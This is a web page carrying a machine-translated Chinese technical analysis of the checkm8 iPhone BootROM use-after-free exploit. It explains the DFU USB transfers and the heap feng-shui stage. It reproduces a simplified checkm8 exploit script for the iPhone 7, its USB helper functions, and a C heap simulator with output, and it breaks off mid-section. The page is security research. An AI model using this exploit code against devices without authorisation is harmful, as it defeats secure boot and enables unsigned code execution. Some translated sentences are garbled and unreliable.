<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🙃 🌰 👇🏽 checkm8漏洞利用的技术分析 💇🏼 🔻 ⚽️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="您很可能已经听说过著名的漏洞利用检查程序m8 ，它在包括iPhone X在内的大多数iDevices的BootROM中使用了不可修复的漏洞iPhone X 在本文中，我们将对此漏洞进行技术分析，并找出导致漏洞的原因。 


 您可以在此处阅读俄语版本。 
 引言 


 首先，让我们简要描述iDev...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>checkm8漏洞利用的技术分析</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/472762/"><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/3l/k0/i2/3lk0i27tlko9sqankyec8rouqhw.png"></div><br><p>您很可能已经听说过著名的漏洞利用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">检查程序m8</a> ，它在包括<code>iPhone X</code>在内的大多数iDevices的<code>BootROM</code>中使用了<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">不可修复</a>的漏洞<code>iPhone X</code> 在本文中，我们将对此漏洞进行技术分析，并找出导致漏洞的原因。 </p><a name="habracut"></a><br><p> 您可以在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">此处</a>阅读俄语版本。 </p><br><h2 id="introduction"> 引言 </h2><br><p> 首先，让我们简要描述iDevice的启动过程以及<code>BootROM</code> （又名<code>SecureROM</code> ）在其中扮演的角色。 可以在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">此处</a>找到有关它的详细信息。 引导如下所示： </p><br><p><img src="https://habrastorage.org/webt/kh/xi/tl/khxitlvaiov5lgx4kt45cq3qng4.png"></p><br><p> 设备上电时，首先执行<code>BootROM</code> 。 其主要任务是： </p><br><ul><li> 平台初始化（已安装必需的平台寄存器，初始化了<code>CPU</code>等） </li><li> 验证并将控制权转移到下一阶段 <br><ul><li>  <code>BootROM</code>支持对<code>IMG3/IMG4</code>映像的解析 </li><li>  <code>BootROM</code>可以访问用于解密映像的<code>GID</code>密钥 </li><li> 为了进行图像验证， <code>BootROM</code>具有内置的公共<code>Apple</code>密钥和必要的加密功能 </li></ul></li><li> 如果无法进一步引导，请还原设备（ <code>Device Firmware Update</code> ， <code>DFU</code> ）。 </li></ul><br><p>  <code>BootROM</code>的体积非常小，可以称为<code>iBoot</code>版，因为它们共享大多数系统和库代码。 尽管与<code>iBoot</code>不同， <code>BootROM</code>无法更新。 制造设备时，它将放入内部只读存储器中。  <code>BootROM</code>是安全启动链信任的硬件根。  <code>BootROM</code>漏洞可能使攻击者能够控制引导过程并在设备上执行未签名的代码。 </p><br><p><img src="https://habrastorage.org/webt/9a/pr/po/9aprpovk-0wg8fs7uya3axvs86s.png"></p><br><h2 id="the-history-of-checkm8">  checkm8的历史 </h2><br><p>  <code>checkm8</code>漏洞已由其作者<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">axi0mX</a>于2019年9月27日添加到<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ipwndfu中</a> 。与此同时，他在Twitter上<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">宣布</a>了更新，并提供了有关此漏洞的描述和其他信息。 根据线索，他在2018年夏季对<code>iBoot</code>进行<code>iOS 12 beta</code>补丁补丁时发现了<code>USB</code>代码中的After <code>use-after-free</code>漏洞。 <br>  <code>BootROM</code>和<code>iBoot</code>共享大多数代码，包括<code>USB</code> ，因此此漏洞也与<code>BootROM</code>有关。 </p><br><p> 如漏洞利用代码所示，该漏洞在<code>DFU</code>被利用。 在这种模式下，可以将签名的图像通过<code>USB</code>传输到设备，稍后再启动。 例如，这对于在更新失败后恢复设备很有用。 </p><br><p> 同一天，用户<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">littlelailo</a>表示他早在三月份就发现了该漏洞，并在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">apollo.txt中</a>发布了描述。 该描述与<code>checkm8</code>相对应，尽管并非所有的利用细节在阅读时都会变得清楚。 这就是为什么我们决定写这篇文章并描述在<code>BootROM</code>执行有效负载之前的所有利用细节。 </p><br><p> 我们基于上述资源和<code>iBoot/SecureROM</code>的源代码对漏洞利用进行了分析，该源代码于2018年2月泄漏。我们还使用了在测试设备<code>iPhone 7</code> （ <code>CPID:8010</code>上进行的实验中获得的数据） 使用<code>checkm8</code> ，我们获得了<code>SecureROM</code>和<code>SecureRAM</code>的转储，这也有助于分析。 </p><br><h2 id="necessary-info-about-usb"> 有关USB的必要信息 </h2><br><p> 由于该漏洞位于<code>USB</code>代码中，因此有必要了解此接口的工作方式。 完整的规范可以在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://www.usb.org/</a>上找到，但是它读起来很长。 就我们的目的而言， <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">NutShell中的USB</a>绰绰有余。 在这里，我们仅提及最相关的要点。 </p><br><p>  <code>USB</code>数据传输有多种类型。 在<code>DFU</code> ，仅使用“ <code>Control Transfers</code>模式（ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">在此处</a>了解更多信息）。 在这种模式下，每个事务都有3个阶段： </p><br><a name="setup_packet"></a><br><ul><li>  <code>Setup Stage</code> -发送<code>SETUP</code>数据包； 它具有以下字段： <br><ul><li>  <code>bmRequestType</code>定义请求的方向，其类型和接收者 </li><li>  <code>bRequest</code>定义要发出的请求 </li><li>  <code>wValue</code> ， <code>wIndex</code>根据请求进行解释 </li><li>  <code>wLength</code>指定<code>Data Stage</code>发送/接收的数据的长度 </li></ul></li><li>  <code>Data Stage</code> -数据传输的可选阶段。 根据在<code>Setup Stage</code>发送的<code>SETUP</code>数据包，数据可以从主机发送到设备（ <code>OUT</code> ），反之亦然（ <code>IN</code> ）。 数据按小部分发送（如果使用<code>Apple DFU</code> ，则为0x40字节）。 <br><ul><li> 当主机要发送另一部分数据时，它将发送一个<code>OUT</code>令牌，然后发送数据本身。 </li><li> 当主机准备好从设备接收数据时，它将向设备发送<code>IN</code>令牌。 </li></ul></li><li>  <code>Status Stage</code> -最后阶段； 报告整个交易的状态。 <br><ul><li> 对于<code>OUT</code>请求，主机发送一个<code>IN</code>令牌，设备必须以零长度的数据包响应该令牌。 </li><li> 对于<code>IN</code>请求，主机发送<code>OUT</code>令牌和零长度数据包。 </li></ul></li></ul><br><p> 下面的方案显示了<code>OUT</code>和<code>IN</code>请求。 我们故意取出<code>ACK</code> ， <code>NACK</code>和其他握手数据包，因为它们对于漏洞利用本身并不重要。 </p><br><p><img src="https://habrastorage.org/webt/lq/cm/-i/lqcm-itvvltjac1kkadebsszkkq.png"></p><br><h2 id="analysis-of-apollotxt">  apollo.txt分析 </h2><br><p> 我们从<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">apollo.txt中</a>的漏洞开始分析。 该文档描述了<code>DFU</code>模式的算法： </p><br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4</a> <br><ol><li> 当USB开始通过dfu获取图像时，dfu注册一个接口来处理所有命令，并为输入和输出分配一个缓冲区。 </li><li> 如果您将数据发送到dfu，则设置包将由主代码处理，然后调出接口代码 </li><li> 接口代码验证wLength短于输入输出缓冲区的长度，如果是这种情况，它将使用指向输入输出缓冲区的指针更新作为参数传递的指针 </li><li> 然后返回wLength，这是它要接收到缓冲区的长度 </li><li> 然后，USB主代码使用长度更新全局变量，并准备好接收数据包 </li><li> 如果接收到数据包，则通过作为参数传递的指针将其写入输入输出缓冲区，并使用另一个全局变量来跟踪已经接收了多少字节 </li><li> 如果接收到所有数据，则再次调用特定于dfu的代码，然后继续将输入输出缓冲区的内容复制到以后从中引导映像的内存位置 </li><li> 之后，usb代码将重置所有变量，然后继续处理新软件包 </li><li> 如果dfu退出，则释放输入输出缓冲区，并且如果映像解析失败，则bootrom重新输入dfu </li></ol><br></blockquote><p> 首先，我们对照<code>iBoot</code>的源代码检查了这些步骤。 我们不能在这里使用泄漏代码的片段，因此我们将使用从<code>IDA</code>中对<code>iPhone7</code>的<code>SecureROM</code>进行反向工程得到的伪代码。 您可以轻松找到<code>iBoot</code>的源代码并进行导航。 </p><br><p> 初始化<code>DFU</code> ，将分配<code>IO</code>缓冲区，并注册用于处理<code>DFU</code>请求的<code>USB</code>接口： </p><br><p><img src="https://habrastorage.org/webt/2r/il/hz/2rilhzhao9dq9561t0nou161xos.png"></p><br><p> 当对<code>DFU</code>的请求的<code>SETUP</code>数据包进入时，将调用适当的接口处理程序。 对于<code>OUT</code>请求（例如，当发送图像时），在成功执行的情况下，处理程序必须返回<code>IO</code>缓冲区的地址以进行事务处理以及它希望接收的数据长度。 这两个值都存储在全局变量中。 </p><br><p><img src="https://habrastorage.org/webt/ha/d7/7i/had77ibmhmmxpmnfmuwqgop96ps.png"></p><br><p> 下面的屏幕截图显示了<code>DFU</code>接口处理程序。 如果请求正确，则返回在<code>DFU</code>初始化期间分配的<code>IO</code>缓冲区的地址和<code>SETUP</code>数据包的预期数据长度。 </p><br><p><img src="https://habrastorage.org/webt/v1/ws/cp/v1wscp8-tw9pwanbkcjal_9zpv4.png"></p><br><p> 在<code>Data Stage</code> ，将<code>Data Stage</code>每个部分写入<code>IO</code>缓冲区，然后<code>IO</code>缓冲区地址偏移并更新接收到的计数器。 接收到所有预期数据后，将调用接口数据处理程序，并清除事务的全局状态。 </p><br><p><img src="https://habrastorage.org/webt/w7/-n/oo/w7-noo36ubqoc4wznkxjezxs_tu.png"></p><br><p> 在<code>DFU</code>数据处理程序中，将接收到的数据移到存储区，以后再从该存储区中加载数据。 根据<code>iBoot</code>的源代码， <code>Apple</code>设备上的该区域称为<code>INSECURE_MEMORY</code> 。 </p><br><p><img src="https://habrastorage.org/webt/ep/sd/ro/epsdro1dycadjstreuvdpkejksa.png"></p><br><p> 当设备退出<code>DFU</code>模式时，先前分配的<code>IO</code>缓冲区将被释放。 如果在<code>DFU</code>模式下成功获取了映像，则将对其进行验证并启动。 如果有任何错误或无法引导映像，则<code>DFU</code>将再次初始化，并且整个过程将从头开始重复。 </p><br><p> 所描述的算法具有“ <code>use-after-free</code>漏洞。 如果我们在上载图像时发送<code>SETUP</code>数据包并完成跳过<code>Data Stage</code>的交易，则全局状态将在下一个<code>DFU</code>周期内保持初始化状态，并且能够写入上一个<code>DFU</code>周期中分配的<code>IO</code>缓冲区的地址。 <code>DFU</code>迭代。 </p><br><p> 既然我们知道<code>use-after-free</code>工作原理，那么问题是，在<code>DFU</code>的下一次迭代期间如何覆盖任何内容？ 在再次初始化<code>DFU</code>之前，将释放所有先前分配的资源，并且新迭代中的内存分配必须完全相同。 事实证明，还有另一个有趣的内存泄漏错误，它允许利用<code>use-after-free</code> 。 </p><br><h2 id="analysis-of-checkm8">  checkm8分析 </h2><br><p> 让我们来<code>checkm8</code>本身。 为了演示起见，我们将使用<code>iPhone 7</code>漏洞利用<code>iPhone 7</code>的简化版本，在其中删除与其他平台有关的所有代码，并更改<code>USB</code>请求的顺序和类型，而不会对其功能造成任何损害。 我们还摆脱了构建有效负载的过程，该过程可以在原始文件<code>checkm8.py</code> 。 很容易发现其他设备版本之间的差异。 </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python from checkm8 import * def main(): print '*** checkm8 exploit by axi0mX ***' device = dfu.acquire_device(1800) start = time.time() print 'Found:', device.serial_number if 'PWND:[' in device.serial_number: print 'Device is already in pwned DFU Mode. Not executing exploit.' return payload, _ = exploit_config(device.serial_number) t8010_nop_gadget = 0x10000CC6C callback_chain = 0x1800B0800 t8010_overwrite = '\0' * 0x5c0 t8010_overwrite += struct.pack('&lt;32x2Q', t8010_nop_gadget, callback_chain) # heap feng-shui stall(device) leak(device) for i in range(6): no_leak(device) dfu.usb_reset(device) dfu.release_device(device) # set global state and restart usb device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001) libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0) dfu.release_device(device) time.sleep(0.5) # heap occupation device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50) for i in range(0, len(payload), 0x800): libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50) dfu.usb_reset(device) dfu.release_device(device) device = dfu.acquire_device() if 'PWND:[checkm8]' not in device.serial_number: print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.' sys.exit(1) print 'Device is now in pwned DFU Mode.' print '(%0.2f seconds)' % (time.time() - start) dfu.release_device(device) if __name__ == '__main__': main()</span></span></code> </pre> <br><p>  <code>checkm8</code>的操作分为<code>checkm8</code>几个阶段： </p><br><ol><li> 堆风水 </li><li> 在不清除全局状态的情况下分配和释放<code>IO</code>缓冲区 </li><li>  <code>use-after-free</code>覆盖覆盖<code>usb_device_io_request</code> </li><li> 放置有效载荷 </li><li> 执行<code>callback-chain</code> </li><li>  <code>shellcode</code>执行 </li></ol><br><p> 让我们详细了解所有阶段。 </p><br><h2 id="1-heap-feng-shui">  1.堆风水 </h2><br><p> 我们认为这是最有趣的阶段，因此我们将花费更多的时间来描述它。 </p><br><pre> <code class="python hljs">stall(device) leak(device) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">6</span></span>): no_leak(device) dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p> 这个阶段对于以有利于利用<code>use-after-free</code>的方式安排堆是必要的。 首先，让我们考虑一下调用<code>stall</code> ， <code>leak</code> ， <code>no_leak</code> ： </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stall</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">0.00001</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">no_leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC1</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br><p>  <code>libusb1_no_error_ctrl_transfer</code>是<code>libusb1_no_error_ctrl_transfer</code>的包装，忽略了在执行请求期间出现的所有异常。  <code>libusb1_async_ctrl_transfer</code>是<code>libusb</code>的<code>libusb_submit_transfer</code>函数的包装程序，用于异步执行需求。 </p><br><p> 以下参数传递给这些调用： </p><br><ul><li> 设备编号 </li><li>  <code>SETUP</code>数据包的数据（您可以在此处找到<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">说明</a> ）： <br><ul><li> <code>bmRequestType</code> </li> <li> <code>bRequest</code> </li> <li> <code>wValue</code> </li> <li> <code>wIndex</code> </li> </ul></li><li> 数据长度（ <code>wLength</code> ）或数据<code>Data Stage</code>的<code>Data Stage</code> </li><li> 请求超时 </li></ul><br><p> 参数<code>bmRequestType</code> ， <code>bRequest</code> ， <code>wValue</code>和<code>wIndex</code>由所有三种请求类型共享： </p><br><ul><li> <code>bmRequestType = 0x80</code> <br> <ul><li>  <code>0b1XXXXXXX</code> <code>Data Stage</code>方向（设备到主机） </li><li>  <code>0bX00XXXXX</code>标准请求类型 </li><li>  <code>0bXXX00000</code>设备是请求的接收者 </li></ul></li><li>  <code>bRequest = 6</code>请求获取描述符（ <code>GET_DESCRIPTOR</code> ） </li><li> <code>wValue = 0x304</code> <br> <ul><li>  <code>wValueHigh = 0x3</code>定义描述符的类型-字符串（ <code>USB_DT_STRING</code> ） </li><li>  <code>wValueLow = 0x4</code>字符串描述符的索引4，对应于设备序列号（在这种情况下，字符串为<code>CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]</code> ） </li></ul></li><li>  <code>wIndex = 0x40A</code>字符串语言的<code>wIndex = 0x40A</code>符，其值与利用无关，可以更改。 </li></ul><br><p> 对于这些请求中的任何一个，在堆中都会为以下结构的对象分配0x30字节： </p><br><p><img src="https://habrastorage.org/webt/-e/ub/wb/-eubwbh-2fhsjb9bs36t0qom7be.png"></p><br><p> 该对象最有趣的字段是<code>callback</code>和<code>next</code> 。 </p><br><ul><li>  <code>callback</code>是指向请求完成后将被调用的函数的指针。 </li><li>  <code>next</code>是指向相同类型的下一个对象的指针； 组织请求队列是必要的。 </li></ul><br><p>  <code>stall</code>的关键特征是它以最小超时使用异步执行请求。 这就是为什么，如果幸运的话，该请求将在操作系统级别被取消并保留在执行队列中，并且事务将无法完成。 另外，设备将继续接收所有即将到来的<code>SETUP</code>数据包，并在必要时将它们放在执行队列中。 后来，在<code>Arduino</code>上对<code>USB</code>控制器进行了试验，我们发现为了成功利用漏洞，我们需要主机发送<code>SETUP</code>数据包和<code>IN</code>令牌，此后由于超时而必须取消事务。 此不完整的交易如下所示： </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/sh/zq/ia/shzqiacghex3lk7jc9nhgoz3m7g.png"></div><br><p> 除此之外，请求的长度仅相差一个单位。 对于标准请求，有一个如下所示的标准<code>callback</code> ： </p><br><p><img src="https://habrastorage.org/webt/cx/as/gn/cxasgnrqyant31ostgflo85zxro.png"></p><br><p>  <code>io_length</code>的值等于请求的<code>SETUP</code>数据包中<code>wLength</code>的最小值和请求描述符的原始长度。 由于描述符很长，我们可以将<code>io_length</code>的值控制在其长度内。  <code>g_setup_request.wLength</code>的值等于最后一个<code>SETUP</code>数据包中的<code>wLength</code>的值。 在这种情况下，它是<code>0xC1</code> 。 </p><br><p> 这样，由调用<code>stall</code>和<code>leak</code>形成的请求就完成了，满足了终端<code>callback</code>函数中的条件，并<code>usb_core_send_zlp()</code> 。 此调用将创建一个空数据包（ <code>zero-length-packet</code> ），并将其添加到执行队列中。 这对于在<code>Status Stage</code>正确完成事务是必要的。 </p><br><p> 通过调用函数<code>usb_core_complete_endpoint_io</code>完成请求。 首先，它调用<code>callback</code> ，然后释放请求的内存。 该请求不仅在整个事务完成时完成，而且在重置<code>USB</code>时也完成。 收到用于重置<code>USB</code>的信号时，执行队列中的所有请求将完成。 </p><br><p> 通过在执行队列中有选择地调用<code>usb_core_send_zlp()</code>并随后释放请求，我们可以获得对堆的充分控制，以利用<code>use-after-free</code> 。 首先，让我们看一下请求清理循环： </p><br><p><img src="https://habrastorage.org/webt/ik/tn/ym/iktnymzi4lywmtf1xsmcfsgpyb4.png"></p><br><p> 如您所见，队列被清空，然后被取消的请求由<code>usb_core_complete_endpoint_io</code>运行和完成。  <code>usb_core_send_zlp</code>分配的请求放入<code>ep-&gt;io_head</code> 。  <code>USB</code>重置完成后，将清除有关端点的所有信息，包括指针<code>io_head</code>和<code>io_tail</code> ，零长度请求将保留在堆中。 因此，我们可以在堆中创建一个小的块。 以下方案显示了它是如何完成的： </p><br><p><img src="https://habrastorage.org/webt/jl/rj/v5/jlrjv55cw23fehubgo7hsqmv68w.png"></p><br><p> 在<code>SecureROM</code>堆中，从最小的适当空闲块中分配了一个新的内存区域。 通过使用上述方法创建一个小的空闲块，我们可以控制<code>USB</code>初始化期间的内存分配，包括<code>io_buffer</code>和请求的分配。 </p><br><p> 为了更好地理解这一点，让我们看看初始化<code>DFU</code>时向堆发出了哪些请求。 在分析<code>iBoot</code>源代码和对<code>SecureROM</code>反向工程时，我们得到了以下顺序： </p><br><ul><li><ol><li> 分配各种字符串描述符 <br><ul><li>  1.1。  <code>Nonce</code> （大小<code>234</code> ） </li><li>  1.2。  <code>Manufacturer</code> （ <code>22</code> ） </li><li>  1.3。  <code>Product</code> （ <code>62</code> ） </li><li>  1.4。  <code>Serial Number</code> （ <code>198</code> ） </li><li>  1.5。  <code>Configuration string</code> （ <code>62</code> ） </li></ul></li></ol><br></li><li><ol><li> 与创建<code>USB</code>控制器任务相关的分配 <br><ul><li>  2.1。 任务结构（ <code>0x3c0</code> ） </li><li>  2.2。 任务堆栈（ <code>0x1000</code> ） </li></ul></li></ol><br></li><li><ol><li>  <code>io_buffer</code> （ <code>0x800</code> ） </li></ol><br></li><li><ol><li> 配置描述符 <br><ul><li>  4.1。  <code>High-Speed</code> （ <code>25</code> ） </li><li>  4.2。  <code>Full-Speed</code> （ <code>25</code> ） </li></ul></li></ol><br></li></ul><br><p> 然后，分配请求结构。 如果堆中有一小块，则第一类的一些分配将到达该堆，所有其他分配将移动。 因此，通过引用旧缓冲区，我们将能够使<code>usb_device_io_request</code>溢出。 看起来像这样： </p><br><p><img src="https://habrastorage.org/webt/on/dl/dy/ondldygtgie2sho2l8xh8q5mlva.png"></p><br><p> 为了计算必要的偏移量，我们仅模拟了上面列出的所有分配，并对<code>iBoot</code>堆的源代码进行了一些修改。 </p><br><div class="spoiler">  <b class="spoiler_title">在DFU中模拟对堆的请求</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"heap.h"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.h&gt; #ifndef NOLEAK #define NOLEAK (8) #endif int main() { void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf("chunk = %p\n", chunk); heap_add_chunk(chunk, 0x100000, 1); malloc(0x3c0); // alignment of the low order bytes of addresses in SecureRAM void * descs[10]; void * io_req[100]; descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); const int N = NOLEAK; void * task = malloc(0x3c0); void * task_stack = malloc(0x4000); void * io_buf_0 = memalign(0x800, 0x40); void * hs = malloc(25); void * fs = malloc(25); void * zlps[2]; for(int i = 0; i &lt; N; i++) { io_req[i] = malloc(0x30); } for(int i = 0; i &lt; N; i++) { if(i &lt; 2) { zlps[i] = malloc(0x30); } free(io_req[i]); } for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_0); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 2; i++) { printf("zlps[%d] = %p\n", i, zlps[i]); } printf("**********\n"); for(int i = 0; i &lt; 5; i++) { free(descs[i]); } free(task); free(task_stack); free(io_buf_0); free(hs); free(fs); descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); task = malloc(0x3c0); task_stack = malloc(0x4000); void * io_buf_1 = memalign(0x800, 0x40); hs = malloc(25); fs = malloc(25); for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_1); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 5; i++) { io_req[i] = malloc(0x30); printf("io_req[%d] = %p\n", i, io_req[i]); } printf("**********\n"); printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0); printf("hs_off = %#lx\n", (int64_t)hs - (int64_t)io_buf_0); printf("fs_off = %#lx\n", (int64_t)fs - (int64_t)io_buf_0); return 0; }</span></span></span></span></code> </pre> </div></div><br><p> 该程序的输出在<code>heap feng-shui</code>阶段有8个请求： </p><br><pre> <code class="plaintext hljs">chunk = 0x1004000 descs[0] = 0x1004480 descs[1] = 0x10045c0 descs[2] = 0x1004640 descs[3] = 0x10046c0 descs[4] = 0x1004800 task = 0x1004880 task_stack = 0x1004c80 io_buf = 0x1008d00 hs = 0x1009540 fs = 0x10095c0 zlps[0] = 0x1009a40 zlps[1] = 0x1009640 ********** descs[0] = 0x10096c0 descs[1] = 0x1009800 descs[2] = 0x1009880 descs[3] = 0x1009900 descs[4] = 0x1004480 task = 0x1004500 task_stack = 0x1004900 io_buf = 0x1008980 hs = 0x10091c0 fs = 0x1009240 io_req[0] = 0x10092c0 io_req[1] = 0x1009340 io_req[2] = 0x10093c0 io_req[3] = 0x1009440 io_req[4] = 0x10094c0 ********** io_req_off = 0x5c0 hs_off = 0x4c0 fs_off = 0x540</code> </pre> <br><p> 如您所见，另一个<code>usb_device_io_request</code>将出现在与前一个缓冲区的起始位置<code>0x5c0</code>处，该位置与漏洞利用代码相对应： </p><br><pre> <code class="python 